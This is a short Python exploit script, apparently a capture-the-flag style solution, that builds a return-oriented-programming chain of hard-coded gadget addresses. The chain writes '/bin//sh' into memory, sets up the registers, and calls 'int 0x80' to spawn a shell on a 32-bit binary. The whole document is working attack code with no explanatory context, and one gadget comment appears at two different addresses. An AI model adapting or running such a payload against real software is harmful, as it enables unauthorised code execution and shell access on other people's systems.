from struct import pack
 
data = 0x080e5010
# Padding goes here
p = 'AAAABBBBCCCC'
 
p += str(pack('<I', 0x0808b285)) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack('<I', data)) # @ .data
p += str(pack('<I', 0x11111111)) # @ NULL
p += str(pack('<I', 0x080b526a)) # pop eax ; ret
p += '/bin'
p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack('<I', data + 4)) # @ .data + 4
p += str(pack('<I', 0x11111111)) # @ NULL
p += str(pack('<I', 0x080b526a)) # pop eax ; ret
p += '//sh'
p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack('<I', data + 8)) # @ .data + 8
p += str(pack('<I', 0x11111111)) # @ NULL
p += str(pack('<I', 0x080506c0)) # xor eax, eax ; ret
p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
p += str(pack('<I', 0x08049022)) # pop ebx ; ret
p += str(pack('<I', data)) # @ .data
p += str(pack('<I', 0x0805e64f)) # pop ecx; add al, 0xf6; ret;
p += str(pack('<I', data + 8)) # @ .data + 8
p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack('<I', data + 8)) # @ .data + 8
p += str(pack('<I', 0x11111111)) # @ NULL
p += str(pack('<I', 0x080506c0)) # xor eax, eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08082a9e)) # inc eax ; ret
p += str(pack('<I', 0x08049b2a)) # int 0x80
print(p)